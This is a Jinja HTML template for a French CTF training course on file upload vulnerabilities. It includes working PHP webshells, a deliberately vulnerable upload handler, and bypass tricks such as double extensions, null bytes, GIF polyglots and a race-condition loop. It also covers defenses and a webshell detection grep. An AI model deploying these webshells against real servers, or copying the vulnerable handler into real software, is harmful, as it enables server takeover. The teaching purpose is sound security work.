{% extends "base.html" %}
{% block title %}Cours : Upload de Fichiers - CyberCampus CTF{% endblock %}

{% block content %}
<section class="page-wrapper course-page">
  
  <!-- Breadcrumb -->
  <div class="breadcrumb">
    <a href="{{ url_for('learn') }}">üìö Biblioth√®que</a>
    <span class="separator">/</span>
    <span class="current">Upload de Fichiers</span>
  </div>

  <!-- En-t√™te du cours -->
  <div class="course-header">
    <div class="course-header-icon">üì§</div>
    <div class="course-header-content">
      <h1>Vuln√©rabilit√©s d'Upload de Fichiers</h1>
      <p class="course-subtitle">Exploiter les failles de validation pour ex√©cuter du code sur le serveur</p>
      <div class="course-badges">
        <span class="badge-critical">Critique</span>
        <span class="badge-time">üìñ 15 min</span>
        <span class="badge-level">‚ö° Interm√©diaire</span>
      </div>
    </div>
  </div>

  <!-- Contenu du cours -->
  <div class="course-content">

    <!-- Section 1 -->
    <div class="course-section">
      <h2>üì§ Introduction aux vuln√©rabilit√©s d'upload</h2>
      <p>
        L'<strong>upload de fichiers</strong> est une fonctionnalit√© courante permettant aux utilisateurs de t√©l√©charger 
        des documents, images, vid√©os sur une application web. Cependant, lorsqu'elle est mal impl√©ment√©e, cette 
        fonctionnalit√© peut devenir l'une des <strong>vuln√©rabilit√©s les plus critiques</strong> d'une application.
      </p>
      <p>
        Un attaquant peut exploiter une mauvaise validation pour uploader un <strong>webshell</strong> (script malveillant) 
        et obtenir l'ex√©cution de code √† distance (RCE - Remote Code Execution) sur le serveur, compromettant ainsi 
        totalement l'application et ses donn√©es.
      </p>
      
      <div class="info-box">
        <div class="info-icon">‚ö†Ô∏è</div>
        <div class="info-content">
          <strong>Impact critique :</strong>
          <p>Une vuln√©rabilit√© d'upload peut permettre √† un attaquant de voler des donn√©es sensibles, cr√©er des backdoors, 
          d√©ployer des ransomwares, ou prendre le contr√¥le total du serveur.</p>
        </div>
      </div>
    </div>

    <!-- Section 2 -->
    <div class="course-section">
      <h2>üéØ Sc√©nario d'attaque typique</h2>
      <p>Voici comment un attaquant exploite une faille d'upload en 5 √©tapes :</p>

      <div class="protection-method">
        <div class="method-number">1</div>
        <div class="method-content">
          <h3>Reconnaissance</h3>
          <p>L'attaquant identifie un formulaire d'upload (avatar, document, CV, etc.)</p>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">2</div>
        <div class="method-content">
          <h3>Test de validation</h3>
          <p>Il teste quelles extensions et types de fichiers sont accept√©s</p>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">3</div>
        <div class="method-content">
          <h3>Bypass des protections</h3>
          <p>Il contourne les validations faibles (double extension, Content-Type, etc.)</p>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">4</div>
        <div class="method-content">
          <h3>Upload du webshell</h3>
          <p>Il upload un fichier malveillant contenant du code ex√©cutable</p>
        </div>
      </div>

      <div class="protection-method">
        <div class="method-number">5</div>
        <div class="method-content">
          <h3>Ex√©cution et compromission</h3>
          <p>Il acc√®de au fichier upload√© et ex√©cute des commandes syst√®me</p>
        </div>
      </div>
    </div>

    <!-- Section 3 -->
    <div class="course-section">
      <h2>üîì Types d'upload vuln√©rables</h2>
      <p>Les vuln√©rabilit√©s varient selon le langage et le serveur web utilis√© :</p>

      <div class="attack-types">
        <div class="attack-type-card">
          <h4>üêò PHP (Apache/Nginx)</h4>
          <p>Extensions : .php, .phtml, .php3, .php5, .php7</p>
          <p><strong>Serveurs :</strong> Apache, Nginx avec PHP-FPM</p>
        </div>
        <div class="attack-type-card">
          <h4>ü™ü ASP/ASPX (IIS)</h4>
          <p>Extensions : .asp, .aspx, .ashx, .cer, .asa</p>
          <p><strong>Serveur :</strong> Microsoft IIS (Windows)</p>
        </div>
        <div class="attack-type-card">
          <h4>‚òï JSP (Java)</h4>
          <p>Extensions : .jsp, .jspx, .war</p>
          <p><strong>Serveurs :</strong> Tomcat, JBoss, WebLogic</p>
        </div>
        <div class="attack-type-card">
          <h4>üî∫ Autres langages</h4>
          <p>Python (.py), Perl (.pl), Ruby (.rb)</p>
          <p>Tout d√©pend de la configuration serveur !</p>
        </div>
      </div>
    </div>

    <!-- Section 4 -->
    <div class="course-section">
      <h2>üíâ Exploitation PHP : L'exemple classique</h2>
      <p>Le PHP reste le vecteur d'attaque le plus courant. Voici un code vuln√©rable typique :</p>

      <div class="code-block">
        <div class="code-header">
          <span class="code-status">‚ö†Ô∏è Code PHP vuln√©rable</span>
          <span class="code-lang">PHP</span>
        </div>
        <pre><code>&lt;?php
// ‚ùå MAUVAISE PRATIQUE - Validation insuffisante
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$fileName = $_FILES['avatar']['name'];
$fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

if (in_array($fileExtension, $allowedExtensions)) {
    move_uploaded_file($_FILES['avatar']['tmp_name'], 
                      'uploads/' . $fileName);
    echo "Avatar upload√© avec succ√®s !";
}
?&gt;</code></pre>
      </div>

      <div class="explanation-box">
        <h4>Probl√®mes de ce code :</h4>
        <ul>
          <li>‚úó Validation uniquement sur l'extension d√©clar√©e dans le nom</li>
          <li>‚úó Pas de v√©rification du contenu r√©el du fichier (MIME type)</li>
          <li>‚úó Accepte les double extensions comme <code>shell.php.jpg</code></li>
          <li>‚úó Ne v√©rifie pas les extensions alternatives PHP (.phtml, .php3, etc.)</li>
          <li>‚úó Stockage dans un r√©pertoire accessible publiquement</li>
        </ul>
      </div>

      <h3>M√©thodes d'exploitation</h3>

      <div class="attack-showcase">
        <div class="attack-input">
          <label>M√©thode 1 : Double extension</label>
          <div class="code-block" style="margin-top: 0.5rem;">
            <pre><code># Cr√©er un webshell
echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php.jpg

# Le fichier se termine par .jpg mais contient du PHP
# Si .htaccess permet l'ex√©cution, Apache ex√©cutera le PHP</code></pre>
          </div>
        </div>
        <div class="attack-output">
          <label>R√©sultat</label>
          <div class="code-block" style="margin-top: 0.5rem;">
            <pre><code>‚úÖ Avatar upload√© avec succ√®s : shell.php.jpg

# Acc√©der au webshell :
http://target.com/uploads/shell.php.jpg?cmd=whoami
# Output: www-data

http://target.com/uploads/shell.php.jpg?cmd=cat%20/flag.txt
# Output: CTF{Upl04d_PHP_Sh3ll_M4st3r}</code></pre>
          </div>
        </div>
      </div>

      <div class="attack-showcase">
        <div class="attack-input">
          <label>M√©thode 2 : Extension alternative</label>
          <div class="code-block" style="margin-top: 0.5rem;">
            <pre><code># Utiliser .phtml au lieu de .php
&lt;?php
echo shell_exec($_GET['cmd']);
?&gt;

# Sauvegarder comme avatar.phtml</code></pre>
          </div>
        </div>
        <div class="attack-output">
          <label>Extensions PHP √† tester</label>
          <ul style="margin-top: 0.5rem;">
            <li>.php, .php3, .php4, .php5, .php7</li>
            <li>.phtml, .pht</li>
            <li>.phps (code source PHP)</li>
            <li>.phar (archives PHP)</li>
          </ul>
        </div>
      </div>

      <div class="attack-showcase">
        <div class="attack-input">
          <label>M√©thode 3 : Fichier polyglotte (GIF + PHP)</label>
          <div class="code-block" style="margin-top: 0.5rem;">
            <pre><code>GIF89a;
&lt;?php system($_GET['cmd']); ?&gt;

# Ce fichier est √† la fois :
# - Une image GIF valide (commence par GIF89a)
# - Du code PHP ex√©cutable</code></pre>
          </div>
        </div>
        <div class="attack-output">
          <label>Avantages</label>
          <ul style="margin-top: 0.5rem;">
            <li>‚úì Passe la validation de signature GIF</li>
            <li>‚úì Passe les v√©rifications MIME type</li>
            <li>‚úì S'ex√©cute si PHP est activ√©</li>
          </ul>
        </div>
      </div>

      <div class="success-box">
        <strong>üí° Astuce Pro :</strong> Utilisez Burp Suite pour intercepter la requ√™te d'upload et modifier 
        le nom du fichier ou le Content-Type √† la vol√©e !
      </div>
    </div>

    <!-- Section 5 -->
    <div class="course-section">
      <h2>üï∏Ô∏è Configuration Apache vuln√©rable</h2>
      <p>Souvent, la vuln√©rabilit√© ne vient pas seulement du code PHP, mais aussi de la configuration serveur :</p>

      <div class="code-block">
        <div class="code-header">
          <span class="code-status">‚ö†Ô∏è .htaccess dangereux</span>
          <span class="code-lang">Apache</span>
        </div>
        <pre><code># ‚ùå MAUVAISE CONFIGURATION
&lt;FilesMatch "\.php"&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;

# Ce regex matche n'importe quel fichier contenant .php
# Donc shell.php.jpg sera ex√©cut√© comme du PHP !</code></pre>
      </div>

      <div class="explanation-box">
        <h4>Pourquoi c'est dangereux ?</h4>
        <p>
          Le <code>FilesMatch</code> utilise une regex qui matche <strong>tout fichier contenant .php</strong> dans son nom.
          Ainsi, <code>shell.php.jpg</code>, <code>avatar.php.png</code>, ou m√™me <code>image.php_backup</code> seront 
          trait√©s comme du code PHP ex√©cutable.
        </p>
      </div>

      <div class="code-block">
        <div class="code-header">
          <span class="code-status">‚úÖ Configuration s√©curis√©e</span>
          <span class="code-lang">Apache</span>
        </div>
        <pre><code># ‚úÖ BONNE CONFIGURATION
&lt;FilesMatch "\.(php|php3|php4|php5|phtml)$"&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;

# Le $ force la correspondance en FIN de nom
# Seuls les fichiers SE TERMINANT par .php seront ex√©cut√©s

# Ou mieux encore, d√©sactiver compl√®tement PHP :
php_flag engine off</code></pre>
      </div>
    </div>

    <!-- Section 6 -->
    <div class="course-section">
      <h2>üöÄ Webshells avanc√©s</h2>
      <p>Une fois l'upload r√©ussi, les attaquants utilisent des webshells sophistiqu√©s :</p>

      <div class="code-block">
        <div class="code-header">
          <span class="code-status">üêö Webshell PHP minimaliste</span>
          <span class="code-lang">PHP</span>
        </div>
        <pre><code>&lt;?php
// Webshell discret en une ligne
if(isset($_GET['c'])) {
    echo "&lt;pre&gt;" . shell_exec($_GET['c']) . "&lt;/pre&gt;";
}
?&gt;

// Utilisation :
// http://target.com/shell.php?c=ls -la
// http://target.com/shell.php?c=cat /etc/passwd</code></pre>
      </div>

      <div class="code-block">
        <div class="code-header">
          <span class="code-status">üêö Webshell avec upload de fichiers</span>
          <span class="code-lang">PHP</span>
        </div>
        <pre><code>&lt;?php
// Ex√©cution de commandes
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// Upload de fichiers suppl√©mentaires
if(isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], 
                       $_FILES['f']['name']);
    echo "File uploaded: " . $_FILES['f']['name'];
}
?&gt;

// Permet d'uploader d'autres outils malveillants</code></pre>
      </div>

      <div class="info-box" style="background: #fff3cd; border-color: #ffc107;">
        <div class="info-icon">üõ°Ô∏è</div>
        <div class="info-content">
          <strong>D√©fense :</strong>
          <p>Les webshells populaires (c99, r57, b374k, WSO) sont souvent d√©tect√©s par les antivirus et WAF. 
          Les attaquants cr√©ent donc des versions obfusqu√©es ou utilisent des techniques d'encodage.</p>
        </div>
      </div>
    </div>

    <!-- Section 7 -->
    <div class="course-section">
      <h2>üé≠ Techniques de bypass avanc√©es</h2>
      <p>Les applications modernes ont souvent des protections. Voici comment les contourner :</p>

      <div class="attack-types">
        <div class="attack-type-card">
          <h4>1Ô∏è‚É£ Bypass Content-Type</h4>
          <p>Intercepter la requ√™te avec Burp Suite et changer :</p>
          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
            <pre><code>Content-Type: image/jpeg
‚Üì
Content-Type: application/x-php</code></pre>
          </div>
        </div>

        <div class="attack-type-card">
          <h4>2Ô∏è‚É£ Caract√®res nuls</h4>
          <p>Exploiter les bugs de parsing (PHP &lt; 5.3.4) :</p>
          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
            <pre><code>shell.php%00.jpg
# Enregistr√© comme shell.php</code></pre>
          </div>
        </div>

        <div class="attack-type-card">
          <h4>3Ô∏è‚É£ Unicode lookalikes</h4>
          <p>Utiliser des caract√®res visuellement similaires :</p>
          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
            <pre><code>shell.—Ä“ª—Ä
# '—Ä' cyrillique au lieu de 'p'</code></pre>
          </div>
        </div>

        <div class="attack-type-card">
          <h4>4Ô∏è‚É£ Race Condition</h4>
          <p>Si l'app valide puis supprime :</p>
          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
            <pre><code>while true; do
  curl upload.php &
  curl shell.php &
done</code></pre>
          </div>
        </div>

        <div class="attack-type-card">
          <h4>5Ô∏è‚É£ Archives compress√©es</h4>
          <p>Si l'app d√©compresse automatiquement :</p>
          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
            <pre><code>zip shell.zip shell.php
# Upload du ZIP</code></pre>
          </div>
        </div>

        <div class="attack-type-card">
          <h4>6Ô∏è‚É£ Validation c√¥t√© client</h4>
          <p>JavaScript facilement bypass√© :</p>
          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
            <pre><code># D√©sactiver JS
# Ou utiliser curl directement</code></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Section 8 -->
    <div class="course-section">
      <h2>üõ°Ô∏è D√©fenses et protections</h2>
      <p>Comment s√©curiser une fonctionnalit√© d'upload ? Voici les bonnes pratiques :</p>

      <div class="checklist">
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Whitelist d'extensions</strong> stricte (jamais de blacklist)</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Validation du contenu r√©el</strong> via magic bytes (MIME type)</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Renommage al√©atoire</strong> des fichiers upload√©s</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Stockage hors du webroot</strong> si possible</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>D√©sactivation de l'ex√©cution</strong> dans le dossier uploads</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Limitation de taille</strong> des fichiers</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Scan antivirus</strong> des fichiers upload√©s</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Permissions restrictives</strong> (644, jamais 777)</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Authentification requise</strong> pour uploader</span>
        </div>
        <div class="checklist-item">
          <span class="check">‚úÖ</span>
          <span><strong>Logging et monitoring</strong> des uploads suspects</span>
        </div>
      </div>

      <h3>Code PHP s√©curis√©</h3>
      <div class="code-block">
        <div class="code-header">
          <span class="code-status">‚úÖ Validation robuste</span>
          <span class="code-lang">PHP</span>
        </div>
        <pre><code>&lt;?php
// ‚úÖ BONNES PRATIQUES

// 1. Whitelist stricte
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$fileName = $_FILES['file']['name'];

// 2. V√©rifier TOUTES les extensions (double extension)
$allExtensions = explode('.', $fileName);
foreach ($allExtensions as $ext) {
    if (!in_array(strtolower($ext), $allowedExtensions)) {
        die("Extension non autoris√©e");
    }
}

// 3. V√©rifier le contenu r√©el (magic bytes)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mimeType, $allowedMimes)) {
    die("Type de fichier invalide");
}
finfo_close($finfo);

// 4. Renommer avec nom al√©atoire
$newName = bin2hex(random_bytes(16)) . '.jpg';
$uploadDir = '/var/data/uploads/'; // HORS du webroot

// 5. D√©placer avec permissions restrictives
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $newName);
chmod($uploadDir . $newName, 0644);

echo "Fichier upload√© en s√©curit√© : " . $newName;
?&gt;</code></pre>
      </div>

      <div class="success-box">
        <strong>üéØ Principe de d√©fense en profondeur :</strong>
        Ne vous reposez jamais sur une seule protection. Combinez plusieurs couches de s√©curit√© 
        pour rendre l'exploitation impossible m√™me si une d√©fense est contourn√©e.
      </div>
    </div>

    <!-- Section 9 -->
    <div class="course-section">
      <h2>üî® Outils d'exploitation</h2>
      <p>Les outils utilis√©s par les pentesters pour tester les uploads :</p>

      <div class="explanation-box">
        <h4>Outils essentiels :</h4>
        <ul>
          <li><strong>Burp Suite :</strong> Intercepter et modifier les requ√™tes HTTP</li>
          <li><strong>OWASP ZAP :</strong> Scanner automatique de vuln√©rabilit√©s</li>
          <li><strong>ffuf / wfuzz :</strong> Fuzzing d'extensions et bypass</li>
          <li><strong>ExifTool :</strong> Manipulation de m√©tadonn√©es</li>
          <li><strong>file / hexdump :</strong> Analyser les magic bytes</li>
        </ul>
      </div>

      <div class="code-block">
        <div class="code-header">
          <span class="code-status">üîç Commandes utiles</span>
          <span class="code-lang">Bash</span>
        </div>
        <pre><code># Identifier le type r√©el d'un fichier
file suspicious.jpg

# Examiner les magic bytes
hexdump -C file.jpg | head

# Fuzzing d'extensions avec ffuf
ffuf -u http://target.com/upload.php \
     -w extensions.txt \
     -X POST \
     -H "Content-Type: multipart/form-data" \
     -mc 200

# Scanner pour webshells sur le serveur
grep -r "system\|exec\|passthru\|shell_exec" /var/www/uploads/</code></pre>
      </div>
    </div>

    <!-- CTA Challenge -->
    <div class="challenge-cta">
      <div class="cta-content">
        <h2>üéØ Pr√™t √† exploiter ?</h2>
        <p>
          Maintenant que vous ma√Ætrisez les vuln√©rabilit√©s d'upload, testez vos comp√©tences sur un challenge r√©el !
          Uploadez un webshell PHP, contournez les protections, et obtenez l'ex√©cution de code √† distance pour 
          r√©cup√©rer le flag cach√© sur le serveur.
        </p>
        <div class="cta-info">
          <div class="cta-detail">
            <span class="cta-icon">‚≠ê</span>
            <span><strong>200 points</strong></span>
          </div>
          <div class="cta-detail">
            <span class="cta-icon">üéì</span>
            <span>Niveau interm√©diaire</span>
          </div>
          <div class="cta-detail">
            <span class="cta-icon">‚è±Ô∏è</span>
            <span>20 minutes</span>
          </div>
        </div>
        <a href="{{ url_for('challenge_view', challenge_id=6) }}" class="btn challenge-btn-large">
          Acc√©der au challenge Upload
        </a>
      </div>
    </div>

    <!-- Navigation -->
    <div class="course-navigation">
      <a href="{{ url_for('learn') }}" class="nav-btn back">
        ‚Üê Retour √† la biblioth√®que
      </a>
      <a href="{{ url_for('learn_osint') }}" class="nav-btn next">
        Cours suivant : OSINT ‚Üí
      </a>
    </div>

  </div>

</section>
{% endblock %}